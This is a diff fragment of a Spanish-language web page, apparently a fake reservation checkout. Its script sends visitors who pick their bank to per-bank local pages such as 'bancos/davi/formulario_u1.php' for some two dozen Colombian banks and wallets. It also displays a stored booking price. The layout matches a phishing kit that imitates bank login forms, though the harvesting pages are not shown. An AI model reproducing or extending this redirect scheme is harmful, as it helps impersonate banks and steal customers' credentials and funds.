+        'BANCO AVVILLAS': 'bancos/villas/formulario_u1.php',
+        'BANCO BBVA': 'bancos/bba/formulario_u1.php',
+        'BANCO CAJA SOCIAL': 'bancos/cjs/formulario_u1.php',
+        'BANCO CITIBANK': 'bancos/colpa/scoti.html',
+        'BANCO COLPATRIA': 'bancos/colpa/formulario_u1.php',
+        'BANCO CORPBANCA': 'bancos/itau/formulario_u1.php',
+        'BANCO DAVIVIENDA': 'bancos/davi/formulario_u1.php',
+        'BANCO DE BOGOTA': 'bancos/bogota/formulario_u1.php',
+        'BANCO DE OCCIDENTE': 'bancos/occi/formulario_u1.php',
+        'BANCO FALABELLA': 'bancos/fala/formulario_u1.php',
+        'BANCO FINANDINA': 'bancos/finan.html',
+        'BANCO GANADERO': 'bancos/ganadero.html',
+        'BANCO GNB SUDAMERIS': 'cargapago.html',
+        'BANCO HSBC COLOMBIA': 'cargapago.html',
+        'BANCO ITAU': 'bancos/itau.html',
+        'BANCO POPULAR': 'bancos/popu.html',
+        'BANCO SANTANDER': 'bancos/santan.html',
+        'BANCO CREDIBANCO': 'cargapago.html',
+        'BANCO HELM BANK': 'cargapago.html',
+        'Nequi': 'bancos/nequi/formulario_u1.php',
+        'SERFINANSA': 'cargapago.html',
+        'SERVIBANCA': 'cargapago.html',
+        'TUYA': 'cargapago.html',
+        'NUBANK': 'cargapago.html',
+                'NN': 'cargapago.html'
+            };
+
+            const url = redirecciones[banco];
+            if (url) {
+                window.location.href = url;
+            } else {
+                ocultarPantallaCarga();
+                alert("Banco no reconocido.");
+            }
+        }
+        
+        // Ejecutar al cargar la página
+        window.onload = function() {
+            obtenerParametros();
+            
+            // Agregar event listeners para validación en tiempo real
+            const inputs = document.querySelectorAll('.form-input, .form-select');
+            inputs.forEach(input => {
+                input.addEventListener('blur', validateForm);
+            });
+        };
+    </script>
+
+    <script>
+document.addEventListener('DOMContentLoaded', function() {
+    const precioGuardado = localStorage.getItem('precioTotalReserva');
+    
+    if (precioGuardado) {
+        const elementoPrecio = document.querySelector('.precio-confirmacion');
+        if (elementoPrecio) {
+            elementoPrecio.textContent = precioGuardado;
+        }
+        
+        // Opcional: limpiar el almacenamiento después de usarlo
+        localStorage.removeItem('precioTotalReserva');
+    }
+});
+</script>
+    
+</body>
+</html>
